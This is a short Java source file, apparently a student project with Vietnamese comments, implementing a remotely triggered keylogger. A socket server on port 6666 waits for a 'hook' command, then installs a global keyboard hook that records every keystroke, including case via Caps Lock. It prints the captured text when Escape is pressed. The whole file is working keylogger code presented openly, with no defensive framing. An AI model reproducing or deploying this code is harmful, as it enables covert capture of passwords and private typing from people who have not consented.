package server;

import java.io.DataInputStream;
import java.net.ServerSocket;
import java.net.Socket;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class Server implements NativeKeyListener {
	
	public String line = ""; // khai báo biến toàn cục line để in phím
	public int capsLock = 0;
	
	public void nativeKeyPressed(NativeKeyEvent e) {
		//System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
		String a = (String) NativeKeyEvent.getKeyText(e.getKeyCode()); 
		
		//Lệnh unhook = nút esc (VC_ESCAPE trong code)
		if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            		try {
            			System.out.println(line);
            			line = "";
                		GlobalScreen.unregisterNativeHook();   // hook mode off
            		} catch (NativeHookException nativeHookException) {
                		nativeHookException.printStackTrace();
            		}
        	}
		else {
			switch (a) {
			case "Space":
				line += " ";
				break;
			case "Enter":
				line += a;
				line +="\n";
				break;
			case "Caps Lock":
				if (capsLock == 0) capsLock = 1;
				else capsLock = 0;
				break;
			default:
				if (capsLock == 0) line += a.toLowerCase();
				else line += a.toUpperCase();
			}
		}
	}

	public static void main(String[] args) {
		try{  
			ServerSocket ss=new ServerSocket(6666);  
			Socket s=ss.accept();//establishes connection   
			DataInputStream dis=new DataInputStream(s.getInputStream());  
			
			// Biến str nhận lệnh từ client
			String  str=(String)dis.readUTF();  
	
			//Nhận lệnh hook
			if (str.equals("hook")) {
				try {
					GlobalScreen.registerNativeHook(); // hook mode on
				}
				catch (NativeHookException ex) {
					System.err.println("There was a problem registering the native hook.");
					System.err.println(ex.getMessage());

					System.exit(1);
				}

				GlobalScreen.addNativeKeyListener(new Server());
			}
			
			ss.close();  
		}catch(Exception e){System.out.println(e);}  
	}
}
